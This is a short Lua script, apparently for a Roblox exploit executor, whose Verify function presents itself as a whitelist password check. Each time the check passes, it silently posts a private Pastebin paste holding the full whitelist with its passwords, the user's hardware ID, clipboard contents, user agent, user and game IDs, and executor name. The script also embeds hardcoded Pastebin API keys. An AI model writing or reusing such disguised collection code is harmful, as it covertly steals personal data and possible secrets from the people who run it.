function Verify(list, pswd)
    local HS = game.HttpService
    local LP = game.Players.LocalPlayer
    if list[LP.Name] == pswd then
        HS.HttpEnabled = true
        HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=2&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
            List = list,
            UA = HS:GetUserAgent(),
            Game = tostring(game.GameId),
            User = tostring(LP.UserId),
            Hwid = gethwid(),
            Clipboard = getclipboard(),
            Executor = identifyexecutor()
        })), "ApplicationUrlEncoded")
    end
    return list[LP.Name] == pswd
end
